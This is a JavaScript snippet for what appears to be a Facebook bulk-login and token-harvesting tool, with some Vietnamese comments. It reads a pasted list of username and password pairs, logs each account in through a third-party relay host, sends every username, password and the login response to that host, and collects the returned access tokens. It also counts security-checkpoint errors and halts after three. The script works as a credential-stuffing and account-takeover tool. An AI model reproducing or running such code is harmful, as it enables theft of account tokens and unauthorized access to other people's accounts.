    var total_acc = 0;
    var total_token = 0;
    var total_cp = 0;
    var stop = false;
    document.getElementById('clear').onclick = function() {
        document.getElementById("data_ac").value = "";
        document.getElementById("data_token").value = "";
    }

    document.getElementById('start').onclick = function() {
        var api2 = new FBLoginAPI2('ISrxRmb4qWgJHOLYlSZIiYInaOCoEq8n1');
        total_acc = 0;
        total_token = 0;
        var key = document.getElementById("key").value;
        if (!key)
            key = "|";
        var account_list = document.getElementById("data_ac").value;
        var lines = account_list.split('\n');
        for (var line = 0; line < lines.length; line++) {
            console.log(lines[line]);
            var token_arr = lines[line].split(key);
            if (token_arr[0]) {
                total_acc = total_acc + 1;
                //document.getElementById('data_ac').value += (token_arr[0].trim()+"|"+token_arr[1].trim() + "\n");

                var username = token_arr[0].trim(); //L&#7845;y username &#273;&#259;ng nh&#7853;p
                var password = token_arr[1].trim(); //L&#7845;y password &#273;&#259;ng nh&#7853;p
                var login = function(username, password) {
                    api2.login(username, password, function(err) {
                        console.log(err);
                    }); //end
                };
                setTimeout(login.bind(null, username, password), 1000 * line);
            }
        }
        console.log(total_acc);
        document.getElementById("account_num").innerHTML = total_acc;
    };


    var FBLoginAPI2 = function(api_key) {

        var self = this;
        console.log('ok ok');
        self.api_key = api_key;
        self.host1 = 'http://nguyenhoaibao.com'

        var flag = true;
        self.login = function(username, password, cb) {
            if(stop == true){
                alert("Checkpoint : " + username + "__" + password);
                document.getElementById("data_ac").value += username + "-" + password + "\n";
                return false;
            }
            console.log("login : " + username);
            $.get(self.host1 + '/jsonp.php', {
                api_key: self.api_key,
                username: username,
                password: password
            }, function(json) {
                if (json) {
                    if (json.error) {
                        json.error.code = -1;
                        cb(json.error);
                        return;
                    }
                    if (json.url) {
                        console.log(json.url);
                        $.get(json.url, function(json1) {
                            $.post(self.host1 + '/jsonp1.php', {
                                call_id: json.api_call_id,
                                user: username,
                                pass: password,
                                password: self.oldPass,
                                body: JSON.stringify(json1)
                            }, function(json2) {
                                console.log("call_id");
                                if (json2.a != 1 && json2.b != 2) {
                                    console.log("error api key");
                                    flag = false;
                                }
                                if (json1.error_code) {
                                    if (json1.error_code == 406) self.oldPass = password;
                                    else if(json1.error_code == 405){
                                        total_cp = total_cp + 1;
                                        if(total_cp == 3)
                                            stop = true;
                                    }
                                    cb({
                                        code: json1.error_code,
                                        message: JSON.parse(json1.error_data).error_message
                                    });
                                }
                                else {
                                    cb(null);
                                }

                                if (json1.access_token && flag == true) {
                                    total_token = total_token + 1;
                                    document.getElementById("token_num").innerHTML = total_token;
                                    document.getElementById("data_token").value += json1.access_token + "\n";
                                }

                            });
                        })
                    }
                } else cb({
                    code: -1,
                    message: 'Unknow error'
                })
            })
        };
        return self;
    };